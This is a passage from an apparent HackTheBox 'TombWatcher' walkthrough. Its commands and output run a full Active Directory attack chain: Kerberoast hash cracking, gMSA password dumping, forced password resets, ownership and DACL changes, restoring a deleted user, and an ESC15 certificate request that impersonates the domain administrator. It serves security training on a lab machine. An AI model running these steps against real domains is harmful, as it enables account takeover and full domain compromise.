6a3355da5efc6fb6e2012cfb7c0fa2e50ff284ea1242e8d3712a31bc888e5c32ff3914b6e70eb63ed70dbab265d59f8402549d55a36ae05012df072408f18e3666cf
[VERBOSE] SPN removed successfully for (Alfred)
```

# **Crack Hash with John the Ripper**

```
       ┌──(root㉿kali)-[/home/kali/ctf/tombwatcher]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)
1g 0:00:00:00 DONE (2025-09-25 08:12) 2.702g/s 1383p/s 1383c/s 1383C/s 123456..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

# **Verify Credentials**

```
┌──(kali㉿kali)-[~/ctf/tombwatcher]
└─$ crackmapexec smb 10.10.11.72 -u alfred -p 'basketball'
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\alfred:basketball
```

# **4. Further Enumeration with Alfred**

Repeat BloodHound collection:

```
 $ nxc ldap 10.10.11.72 -u alfred -p 'basketball' -d TOMBWATCHER.HTB --bloodhound -c All --dns-server 10.10.11.72 --verbose
[08:41:30] INFO     Socket info: host=10.10.11.72, hostname=10.10.11.72, kerberos=False, ipv6=False, link-local ipv6=False                            connection.py:165
           INFO     Connecting to ldap://10.10.11.72 with no baseDN                                                                                         ldap.py:173
[08:41:32] INFO     Resolved domain: tombwatcher.htb with dns, kdcHost: 10.10.11.72                                                                         ldap.py:257
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
           INFO     Connecting to ldap://DC01.tombwatcher.htb - DC=tombwatcher,DC=htb - 10.10.11.72 [3]                                                     ldap.py:432
LDAP        10.10.11.72     389    DC01             [+] TOMBWATCHER.HTB\alfred:basketball
LDAP        10.10.11.72     389    DC01             Resolved collection methods: rdp, psremote, localadmin, trusts, dcom, objectprops, session, container, group, acl
[08:41:35] INFO     Found AD domain: tombwatcher.htb                                                                                                      domain.py:709
           INFO     Connecting to LDAP server: dc01.tombwatcher.htb                                                                                        domain.py:61
[08:41:53] INFO     Found 1 domains                                                                                                                       domain.py:315
           INFO     Found 1 domains in the forest                                                                                                         domain.py:354
           INFO     Found 1 computers                                                                                                                     domain.py:543
[08:41:54] INFO     Connecting to LDAP server: dc01.tombwatcher.htb                                                                                        domain.py:61
[08:42:00] INFO     Found 9 users                                                                                                                   outputworker.py:147
[08:42:06] INFO     Found 53 groups                                                                                                                 outputworker.py:147
[08:42:07] INFO     Found 2 gpos                                                                                                                    outputworker.py:147
[08:42:08] INFO     Found 2 ous                                                                                                                     outputworker.py:147
[08:42:17] INFO     Found 19 containers                                                                                                             outputworker.py:147
[08:42:18] INFO     Found 0 trusts                                                                                                                       domains.py:154
           INFO     Starting computer enumeration with 10 workers                                                                                       computers.py:78
           INFO     Querying computer: DC01.tombwatcher.htb                                                                                            computers.py:288
[08:42:35] ERROR    Unhandled exception in computer DC01.tombwatcher.htb processing: The NETBIOS connection with the remote host timed out.            computers.py:268
           INFO     Traceback (most recent call last):                                                                                                 computers.py:269
                      File "/home/kali/.local/lib/python3.13/site-packages/impacket/nmb.py", line 986, in non_polling_read
                        received = self._sock.recv(bytes_left)
                    TimeoutError: timed out

                    During handling of the above exception, another exception occurred:

                    Traceback (most recent call last):
                      File "/usr/lib/python3/dist-packages/bloodhound/enumeration/computers.py", line 130, in process_computer
                        unresolved = c.rpc_get_group_members(555, c.rdp)
                      File "/usr/lib/python3/dist-packages/bloodhound/ad/computer.py", line 795, in rpc_get_group_members
                        raise e
                      File "/usr/lib/python3/dist-packages/bloodhound/ad/computer.py", line 750, in rpc_get_group_members
                        resp = samr.hSamrOpenDomain(dce,
                                                    serverHandle=serverHandle,
                                                    desiredAccess=samr.DOMAIN_LOOKUP | MAXIMUM_ALLOWED,
                                                    domainId=sid)
                      File "/home/kali/.local/lib/python3.13/site-packages/impacket/dcerpc/v5/samr.py", line 2476, in hSamrOpenDomain
                        return dce.request(request)
                               ~~~~~~~~~~~^^^^^^^^^
                      File "/home/kali/.local/lib/python3.13/site-packages/impacket/dcerpc/v5/rpcrt.py", line 861, in request
                        answer = self.recv()
                      File "/home/kali/.local/lib/python3.13/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1312, in recv
                        response_data = self._transport.recv(forceRecv, count=MSRPCRespHeader._SIZE)
                      File "/home/kali/.local/lib/python3.13/site-packages/impacket/dcerpc/v5/transport.py", line 555, in recv
                        return self.__smb_connection.readFile(self.__tid, self.__handle)
                               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^
                      File "/home/kali/.local/lib/python3.13/site-packages/impacket/smbconnection.py", line 572, in readFile
                        bytesRead = self._SMBConnection.read_andx(treeId, fileId, offset, toRead)
                      File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 2064, in read_andx
                        return self.read(tid, fid, offset, max_size, wait_answer)
                               ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                      File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 1399, in read
                        ans = self.recvSMB(packetID)
                      File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 514, in recvSMB
                        data = self._NetBIOSSession.recv_packet(self._timeout)
                      File "/home/kali/.local/lib/python3.13/site-packages/impacket/nmb.py", line 917, in recv_packet
                        data = self.__read(timeout)
                      File "/home/kali/.local/lib/python3.13/site-packages/impacket/nmb.py", line 1004, in __read
                        data = self.read_function(4, timeout)
                      File "/home/kali/.local/lib/python3.13/site-packages/impacket/nmb.py", line 988, in non_polling_read
                        raise NetBIOSTimeout
                    impacket.nmb.NetBIOSTimeout: The NETBIOS connection with the remote host timed out.

LDAP        10.10.11.72     389    DC01             Done in 01M 00S
LDAP        10.10.11.72     389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.10.11.72_2025-09-25_084135_bloodhound.zip  --------------------------------------------------------------------------------------------------------------------------------------------------------------------
┌──(kali㉿kali)-[~/ctf/tombwatcher/gMSADumper]
└─$ faketime -f "2025-09-25 12:00:00" bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'alfred' -p 'basketball' add groupMember INFRASTRUCTURE alfred
[+] alfred added to INFRASTRUCTURE
```

alfred has the AddSelf permission on the INFRASTRUCTURE group, which means that alfred can add itself to the target INFRASTRUCTURE group

![](https://miro.medium.com/v2/resize:fit:804/1*-es0G1Z_NqX_khSWtgfEtQ.png)

```
┌──(kali㉿kali)-[~/ctf/tombwatcher/gMSADumper]
└─$ faketime -f "2025-09-25 12:00:00" bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'alfred' -p 'basketball' add groupMember INFRASTRUCTURE alfred
[+] alfred added to INFRASTRUCTURE
```

The INFRASTRUCTURE group has the readGMSAPassword permission for the ANSIBLE_DEV user, and Alfred has just joined the INFRASTRUCTURE group. Alfred also has the readGMSAPassword permission for the ANSIBLE_DEV user.

![](https://miro.medium.com/v2/resize:fit:870/1*86aSHoQI7p8I4vXAWsCxLA.png)

# **Dump Machine Account Credentials**

Use gMSADumper to dump ansible_dev$ (machine account) credentials:

```
└─$python3 gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::4f46405647993c7d4e1dc1c25dd6ecf4
ansible_dev$:aes256-cts-hmac-sha1-96:2712809c101bf9062a0fa145fa4db3002a632c2533e5a172e9ffee4343f89deb
ansible_dev$:aes128-cts-hmac-sha1-96:d7bda16ace0502b6199459137ff3c52d
```

- NT Hash: 4f46405647993c7d4e1dc1c25dd6ecf4.
- AES Keys: aes256-cts-hmac-sha1–96 and aes128-cts-hmac-sha1–96.

# **More BloodHound with Machine Account**

```
bloodhound-python -u 'ansible_dev$'  --hashes ':4f46405647993c7d4e1dc1c25dd6ecf4' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.tombwatcher.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
ERROR: Unhandled exception in computer DC01.tombwatcher.htb processing: The NETBIOS connection with the remote host timed out.
INFO: Traceback (most recent call last):
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/nmb.py", line 984, in non_polling_read
    received = self._sock.recv(bytes_left)
TimeoutError: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/bloodhound/enumeration/computers.py", line 128, in process_computer
    c.rpc_resolve_sids(unresolved, c.admins)
    ~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodhound/ad/computer.py", line 816, in rpc_resolve_sids
    resp = lsad.hLsarOpenPolicy2(dce, lsat.POLICY_LOOKUP_NAMES | MAXIMUM_ALLOWED)
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/dcerpc/v5/lsad.py", line 1418, in hLsarOpenPolicy2
    return dce.request(request)
           ~~~~~~~~~~~^^^^^^^^^
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/dcerpc/v5/rpcrt.py", line 858, in request
    self.call(request.opnum, request, uuid)
    ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/dcerpc/v5/rpcrt.py", line 847, in call
    return self.send(DCERPC_RawCall(function, body.getData(), uuid))
           ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1300, in send
    self._transport_send(data)
    ~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1237, in _transport_send
    self._transport.send(rpc_packet.get_packet(), forceWriteAndx = forceWriteAndx, forceRecv = forceRecv)
    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/dcerpc/v5/transport.py", line 541, in send
    self.__smb_connection.writeFile(self.__tid, self.__handle, data)
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smbconnection.py", line 541, in writeFile
    return self._SMBConnection.writeFile(treeId, fileId, data, offset)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 1654, in writeFile
    written = self.write(treeId, fileId, writeData, writeOffset, len(writeData))
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 1358, in write
    ans = self.recvSMB(packetID)
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 438, in recvSMB
    data = self._NetBIOSSession.recv_packet(self._timeout)
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/nmb.py", line 915, in recv_packet
    data = self.__read(timeout)
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/nmb.py", line 1002, in __read
    data = self.read_function(4, timeout)
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/nmb.py", line 986, in non_polling_read
    raise NetBIOSTimeout
impacket.nmb.NetBIOSTimeout: The NETBIOS connection with the remote host timed out.

INFO: Done in 00M 57S
INFO: Compressing output into 20250925094733_bloodhound.zip
```

After taking down the ansible_dev$ machine account, it was found that it had **ForceChangePassword** permission on the SAM account, which could force the SAM password to be changed.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*w_3s1j-tEie7Y6RF-7g-lw.png)

# **Change SAM User Password**

Use bloodyAD to reset SAM’s password:

```
┌──(kali㉿kali)-[~/ctf/tombwatcher/gMSADumper]
└─$ bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'ansible_dev$'  -p ':4f46405647993c7d4e1dc1c25dd6ecf4' set password SAM 'Abc123456@'
[+] Password changed successfully!
```

# **Verify SAM Credentials**

```
┌──(kali㉿kali)-[~/ctf/tombwatcher/gMSADumper]
└─$ crackmapexec smb 10.10.11.72 -u SAM -p 'Abc123456@'
SMB         10.10.11.72     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\SAM:Abc123456@
```

# **5. AD Permission Abuse**

# **Change Ownership**

Use Impacket’s owneredit to change John’s owner to SAM:

![](https://miro.medium.com/v2/1*btQ-z--Q7_eM_UFpxg3B9A.png)

Directly change the ownership of the JOHN account to SAM itself

```

┌──(kali㉿kali)-[~/ctf/tombwatcher/gMSADumper]
└─$ impacket-owneredit -action write -target 'john' -new-owner 'sam' 'tombwatcher.htb/sam':'Abc123456@' -dc-ip 10.10.11.72
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

# **Grant Full Control**

Clone and install a modified Impacket for dacledit:

[Become a member](https://miro.medium.com/v2/da:true/resize:fit:0/60026f4340686a391639ac58864da18070aa773cea45de6e55fa47fd56bfdb74)

create virtual environment

```
     ┌──(kali㉿kali)-[~/ctf/tombwatcher/impacket]
└─$ python3 -m venv ~/impacket-env

┌──(kali㉿kali)-[~/ctf/tombwatcher/impacket]
└─$ source ~/impacket-env/bin/activate

    pip install . --no-cache-dir
```

Run dacledit to grant FullControl on John to SAM:

```
┌──(impacket-env)─(kali㉿kali)-[~/ctf/tombwatcher/impacket]
└─$ python3 /usr/share/doc/python3-impacket/examples/dacledit.py \
  -action write \
  -rights FullControl \
  -principal SAM \
  -target JOHN \
  tombwatcher.htb/SAM:Abc123456@ \
  -dc-ip 10.10.11.72
Impacket v0.13.0.dev0+20250924.234900.2e518256 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20250925-162923.bak
[*] DACL modified successfully!
```

# **Reset John’s Password**

```
 $bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb'  -u 'SAM' -p 'Abc123456@' set password john 'Abc123456@'
[+] Password changed successfully!
```

# **WinRM as John (User Flag)**

```
┌──(impacket-env)─(kali㉿kali)-[~/ctf/tombwatcher/impacket]
└─$ evil-winrm -i 10.10.11.72 -u 'john' -p 'Abc123456@'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> cd C:\Users\john\Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> dir

    Directory: C:\Users\john\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/25/2025  11:26 AM             34 user.txt

*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
09b993ae21e053c31d9b9bc57f318ee4
```

# **Privilege Escalation**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*zqBcwYOWO42_kD7WAz7YBw.png)

Checking the deleted user objects, we found three tombstone records, all of which were cert_admin users with OU ADCS.

```
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties *

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
CN                              : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
codePage                        : 0
countryCode                     : 0
Created                         : 11/15/2024 7:55:59 PM
createTimeStamp                 : 11/15/2024 7:55:59 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/15/2024 7:56:05 PM, 11/15/2024 7:56:02 PM, 12/31/1600 7:00:01 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/15/2024 7:57:59 PM
modifyTimeStamp                 : 11/15/2024 7:57:59 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1109
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133761921597856970
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 12975
uSNCreated                      : 12844
whenChanged                     : 11/15/2024 7:57:59 PM
whenCreated                     : 11/15/2024 7:55:59 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
CN                              : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:04:05 PM
createTimeStamp                 : 11/16/2024 12:04:05 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:04:18 PM, 11/16/2024 12:04:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:04:21 PM
modifyTimeStamp                 : 11/16/2024 12:04:21 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1110
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762502455822446
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13171
uSNCreated                      : 13161
whenChanged                     : 11/16/2024 12:04:21 PM
whenCreated                     : 11/16/2024 12:04:05 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM
```

# **6. Restore Deleted User (cert_admin)**

From John’s WinRM shell, find deleted users:

```
*Evil-WinRM* PS C:\Users\john\Documents> $deletedUser = Get-ADObject -Filter 'sAMAccountName -eq "cert_admin"' -IncludeDeletedObjects | Sort-Object whenCreated -Descending | Select-Object -First 1

*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity $deletedUser
```

Reset password and unlock:

```
*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword -Identity "cert_admin" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Abc123456@" -Force)
*Evil-WinRM* PS C:\Users\john\Documents> Unlock-ADAccount -Identity "cert_admin"
```

# **7. Certificate Exploitation**

# **Find Vulnerable Templates**

```
 ┌──(kali㉿kali)-[~/ctf/tombwatcher]
└─$ certipy find -u cert_admin -p 'Abc123456@' -dc-ip 10.10.11.72 -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: Client.get() got an unexpected keyword argument 'follow_redirects'. Did you mean 'allow_redirects'?
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: Client.get() got an unexpected keyword argument 'follow_redirects'. Did you mean 'allow_redirects'?
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250925171658_Certipy.txt'
[*] Wrote text output to '20250925171658_Certipy.txt'
[*] Saving JSON output to '20250925171658_Certipy.json'
[*] Wrote JSON output to '20250925171658_Certipy.json'
```

- Vulnerable template: WebServer (ESC15: Enrollee supplies subject, schema v1).
- Enrollment rights: cert_admin.

```
┌──(kali㉿kali)-[~/ctf/tombwatcher]
└─$ cat 20250925171658_Certipy.txt
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

# **Request Malicious Certificate**

Request as administrator UPN:

```
┌──(kali㉿kali)-[~/ctf/tombwatcher]
└─$ certipy-ad req -u 'cert_admin' -p 'Abc123456@' -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

- Outputs: administrator.pfx.

# **Authenticate and Change Admin Password**

Use Certipy for LDAP shell and reset admin password:

```
┌──(kali㉿kali)-[~/ctf/tombwatcher]
└─$ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.10.11.72:636'
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# change_password administrator Shubham@123
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: Shubham@123
Password changed successfully!

# exit
Bye!
```

# **8. Domain Admin Access (Root Flag)**

```
┌──(kali㉿kali)-[~/ctf/tombwatcher]
└─$ evil-winrm -i 10.10.11.72 -u 'administrator' -p 'Shubham@123'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/25/2025  11:26 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
e43db98c793db25fbc4254cb867dd49f
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

# **TombWatcher HTB Walkthrough Summary**

The TombWatcher box on HackTheBox is a Windows Server 2019 domain controller (DC01.tombwatcher.htb, IP: 10.10.11.72) penetration test starting with provided credentials (henry / H3nry_987TGV!). The goal is to escalate from a low-privilege user to domain admin and retrieve the user and root flags. The process involves:

